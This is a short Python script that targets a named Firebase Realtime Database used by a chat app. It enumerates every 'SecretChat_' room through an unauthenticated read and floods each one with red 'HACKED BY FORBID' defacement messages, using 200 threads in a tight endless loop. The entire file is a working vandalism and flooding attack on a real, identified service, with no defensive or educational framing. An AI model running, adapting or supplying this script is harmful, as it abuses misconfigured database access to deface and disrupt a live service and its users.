import time
import requests
from concurrent.futures import ThreadPoolExecutor

database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"

headers = {
    "Content-Type": "application/json"
}

print("[FORBID] Clean-Render Broadcaster Initialized...")

session = requests.Session()

def blast_room(room_url):
    try:
        # Cleaned up RichText syntax to prevent raw code glitches while keeping it massive and bold
        payload = {
            "Sender": '<font color="#FF0000"><b>FORBID</b></font>',
            "Message": '<font color="#FF0000"><b>HACKED BY FORBID | DISCORD: forbiddenway</b></font>',
            "Text": '<font color="#FF0000"><b>HACKED BY FORBID | DISCORD: forbiddenway</b></font>',
            "Timestamp": int(time.time() * 1000),
            "Aura": "voidWings",
            "Color": "red"
        }
        session.post(room_url, json=payload, headers=headers, timeout=1)
    except Exception:
        pass

while True:
    try:
        root_response = session.get(f"{database_url}/.json", timeout=3)
        
        if root_response.status_code == 200:
            data = root_response.json()
            if isinstance(data, dict):
                room_urls = [
                    f"{database_url}/{key}.json" 
                    for key in data.keys() 
                    if key.startswith("SecretChat_")
                ]
                
                if room_urls:
                    with ThreadPoolExecutor(max_workers=200) as executor:
                        executor.map(blast_room, room_urls)
                    print(f"[FORBID] Clean blast wave delivered to {len(room_urls)} active servers!")
                    
    except Exception as e:
        print(f"[FORBID] Loop error: {e}")
        
    time.sleep(0.01)
